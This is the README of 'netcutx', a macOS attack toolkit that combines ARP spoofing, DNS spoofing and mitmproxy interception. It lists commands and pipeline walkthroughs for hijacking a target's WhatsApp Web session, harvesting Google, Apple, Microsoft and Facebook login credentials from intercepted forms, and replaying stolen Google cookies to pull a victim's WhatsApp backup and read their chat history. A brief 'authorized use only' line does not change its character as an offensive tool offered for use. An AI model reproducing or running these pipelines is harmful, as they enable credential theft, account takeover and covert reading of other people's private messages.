# netcutx

LAN access control & extraction toolkit for macOS. ARP spoofing + passive capture + OS fingerprinting + DNS spoofing + traffic interception + data extraction.

> **For authorized use only.** Use on networks you own or have explicit permission to test.

## Features

### Core — ARP Spoofing
- Auto-detect interface, gateway, and local devices
- Network scan via ARP (active + cache)
- Multi-target mass deauth — cut multiple devices simultaneously
- Two attack modes: cut connection or full MITM
- Graceful ARP restore on exit
- Daemon mode + menubar GUI

### Fase 1 — Passive Capture (`monitor`)
- Raw BPF packet capture — Ethernet + IPv4 + TCP/UDP header parsing
- JSON output per line — pipe to `jq` for analysis
- Filter by target IP, exclude self traffic
- TCP flag parsing (SYN, ACK, FIN, RST, PSH, URG)
- WhatsApp traffic detection (`--detect-wa`): match IP ranges `31.13.0.0/16`, parse TLS SNI, classify WEB/CHAT/MEDIA/STATIC

### Fase 2 — Device OS Fingerprint (`fingerprint`)
- TCP SYN probe via raw BPF (7 ports: 22, 80, 443, 5555, 62078, 8080, 8443)
- TTL analysis + ICMP fallback
- Classify: Android, iPhone, Windows, Linux, Router
- Batch mode: probe all targets simultaneously (2.5s total)

### Fase 3 — DNS Spoofing (`dns-spoof`)
- Intercept DNS queries via BPF recv, inject spoofed responses
- Full Ethernet + IP + UDP + DNS frame builder
- Multiple domain rules: `domain1=fakeip1 domain2=fakeip2`
- Low TTL (5s) to prevent caching
- Combined MITM + DNS spoof in one loop

### Fase 4 — HTTP Redirect (`redirect`)
- macOS pf anchor management
- Redirect target port 80/443 to local proxy
- `redirect start|stop|status`
- Optional auto-launch mitmproxy

### Fase 5 — WhatsApp Extraction Pipeline
- **`wa-hijack`** — WhatsApp Web session hijack
  - MITM + DNS spoof `web.whatsapp.com` → attacker IP
  - pf redirect 443 → mitmproxy with Python addon
  - Addon monitors `Set-Cookie` headers, captures `wa_session` cookie
  - Cookie replay → access chats without QR code
- **`cred-harvest`** — HTTPS credential harvester
  - MITM + pf redirect → mitmproxy
  - Addon monitors POST forms on Google, Apple, Microsoft, Facebook
  - Extracts email, password, username fields
- **`cloud-extract`** — Google/Apple session hijack + backup guide
  - Captures session cookies from `accounts.google.com`, `appleid.apple.com`
  - Captures login credentials as fallback
  - Replay cookie → access Google Takeout → download WhatsApp backup
  - Extract `msgstore.db` from backup for full chat history

## Requirements

- macOS 13+
- Xcode Command Line Tools
- `sudo` (BPF requires root)
- `mitmproxy` (for extraction features: `brew install mitmproxy`)

## Build

```bash
# Build CLI daemon
make

# Build GUI app only
make ui

# Build everything
make && make ui
```

Outputs:
- `build/netcutx` — CLI binary (all features)
- `build/NetcutxUI` — GUI binary
- `build/NetcutxUI.app` — macOS app bundle (after `make app`)

## Commands Overview

### System
```bash
sudo ./build/netcutx install         # Install LaunchDaemon
sudo ./build/netcutx uninstall       # Remove daemon
sudo ./build/netcutx upgrade         # Hot-reload new binary
sudo ./build/netcutx stop all        # Stop active spoofing
sudo ./build/netcutx status          # Show daemon PID
```

### Reconnaissance
```bash
sudo ./build/netcutx monitor <ip>                    # Passive traffic capture (JSON)
sudo ./build/netcutx monitor <ip> --detect-wa        # ... with WhatsApp detection
sudo ./build/netcutx fingerprint <ip>                # OS fingerprint device
```

### Interception
```bash
sudo ./build/netcutx <victim-ip> -b -f               # Full MITM spoof
sudo ./build/netcutx dns-spoof <ip> domain=fakeip    # MITM + DNS spoof
sudo ./build/netcutx redirect start <ip>             # pf redirect 443 → proxy
sudo ./build/netcutx redirect stop                   # Clear pf rules
```

### Extraction
```bash
sudo ./build/netcutx wa-hijack <ip>                  # WhatsApp Web session hijack
sudo ./build/netcutx cred-harvest <ip>               # Google/Apple credential capture
sudo ./build/netcutx cloud-extract <ip>              # Cloud session + backup guide
```

## Pipeline Examples

### WhatsApp Web Session Hijack
```bash
sudo ./build/netcutx wa-hijack 192.168.1.100
# Target opens web.whatsapp.com → scans QR
# [NETCUTX] WA SESSION CAPTURED!
# Cookie saved to /tmp/netcutx_wa_session.txt
# Replay: DevTools → Application → Cookies → add cookie → refresh
```

### WhatsApp Mobile — Cloud Backup Extraction
```bash
# Step 1: Capture Google session
sudo ./build/netcutx cloud-extract 192.168.1.100
# Target logs into Google → session cookie captured

# Step 2: Replay cookie in browser
# → takeout.google.com → request WhatsApp backup → download ZIP

# Step 3: Extract chat history
# sqlite3 msgstore.db "SELECT * FROM messages LIMIT 20;"
```

### Combined Pipeline: Monitor + Detect + Export
```bash
sudo ./build/netcutx monitor 192.168.1.100 --detect-wa 2>/dev/null | tee capture.jsonl
```

## Architecture

All features built on macOS BPF (`/dev/bpf*`) for raw Ethernet frame injection and capture:

```
BPF (raw sockets)
├── ARP spoof (send poison frames)
├── TCP SYN probe (fingerprint)
├── DNS query intercept + response
└── Passive packet capture (JSON)

pfctl
└── rdr rules (HTTP/HTTPS → local proxy)

mitmproxy (external)
├── TLS decryption
├── Session cookie sniffer (WA Web, Google, Apple)
└── Credential harvester (POST form data)
```

## Source Map

```
Sources/netcutx/
├── main.swift              CLI entry, subcommand parser
├── ARPTypes.swift          MAC/IP types, helpers
├── ARPFrame.swift          ARP frame builder
├── Spoofer.swift           ARP spoof loop
├── NetworkScanner.swift    ARP network scanner
├── Daemon.swift            LaunchDaemon lifecycle
├── DaemonIPC.swift         Unix socket IPC
├── DaemonState.swift       Thread-safe state
├── UI.swift                Terminal UI, DeviceInfo, colors
├── MACResolver.swift       ARP MAC resolution
├── Capture.swift           Passive packet capture + WA detection
├── DeviceFingerprint.swift OS fingerprint via TCP SYN + TTL
├── DNSSpoofer.swift        DNS query interceptor + response builder
├── HTTPRedirect.swift      pf anchor management
├── WADetector.swift        WhatsApp IP/TLS SNI detector
├── Extraction.swift        WA Web hijack + credential harvest orchestration
└── CloudExtract.swift      Google/Apple session hijack + cloud backup guide
```

## Version

v2.0.0
